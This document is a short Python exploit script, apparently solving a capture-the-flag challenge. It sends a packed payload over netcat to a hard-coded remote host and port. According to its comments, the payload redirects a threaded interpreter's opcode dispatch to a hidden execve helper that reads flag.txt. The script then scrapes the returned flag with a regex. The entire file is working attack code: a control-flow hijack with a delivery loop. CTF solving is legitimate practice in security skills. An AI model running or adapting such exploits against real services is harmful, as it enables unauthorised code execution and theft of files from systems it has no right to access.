#!/usr/bin/env python3
import re
import struct
import subprocess

HOST = "143.198.163.4"
PORT = 1900


def build_payload() -> bytes:
    # Threaded interpreter jumps to opcode as a code pointer.
    # 0x8008574 lands in hidden execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL) helper.
    # Layout needs one extra qword because this helper uses plain `ret`.
    return struct.pack(
        "<QQQ",
        0x8008574,
        0x4141414141414141,
        0xD0D0000,
    )


def main() -> None:
    payload = build_payload()
    out = b""
    for _ in range(8):
        proc = subprocess.run(
            ["nc", HOST, str(PORT)],
            input=payload,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        if proc.stdout:
            out = proc.stdout
            break

    match = re.search(rb"texsaw\{[^\r\n]*\}", out)
    if not match:
        raise SystemExit("Flag not found in server response")

    print(match.group(0).decode())


if __name__ == "__main__":
    main()
